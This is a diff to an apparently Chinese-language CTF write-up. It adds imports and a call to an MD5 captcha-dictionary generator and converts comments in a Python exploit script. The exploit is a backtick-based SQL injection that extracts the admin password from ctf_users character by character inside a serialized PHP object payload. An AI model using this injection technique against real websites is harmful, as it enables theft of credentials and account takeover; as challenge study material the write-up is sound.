@@ -107,6 +107,9 @@ pool.join()
 ### 生成字典
 
 ```python
+import hashlib
+from itertools import product
+
 def get_code_dict():
     c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'
     captchas = [''.join(i) for i in product(c, repeat=3)]
@@ -115,6 +118,8 @@ def get_code_dict():
     with open('captchas.txt', 'w') as f:
         for k in captchas:
             f.write(hashlib.md5(k.encode('utf-8')).hexdigest()+' --> '+k+'\n')
+
+get_code_dict()
 ```
 
 使用`login`登录, 到`index`.
@@ -220,11 +225,11 @@ password = '123'
 
 login(username, password)
 
-// 1. 使用 `, 截断 signature
-// 2. 在 ctf_users 表中查出 is_admin=1 的 password
-// 3. 使用 substr() 每次取一个字符, 使用 ord() 返回字符的ASCII码
-// 4. 使用 concat() 拼接为序列化后的 Mood
-// 5. 使用 -- 截断后面的SQL语句
+# 1. 使用 `, 截断 signature
+# 2. 在 ctf_users 表中查出 is_admin=1 的 password
+# 3. 使用 substr() 每次取一个字符, 使用 ord() 返回字符的ASCII码
+# 4. 使用 concat() 拼接为序列化后的 Mood
+# 5. 使用 -- 截断后面的SQL语句
 i = 1
 mood = '(select concat(`O:4:\"Mood\":3:{{s:4:\"mood\";i:`,ord(substr(password,{},1)),`;s:2:\"ip\";s:14:\"80.212.199.161\";s:4:\"date\";i:1520664478;}}`) from ctf_users where is_admin=1 limit 1)'.format(i)
 payload = 'a`, {}); -- -'.format(mood)
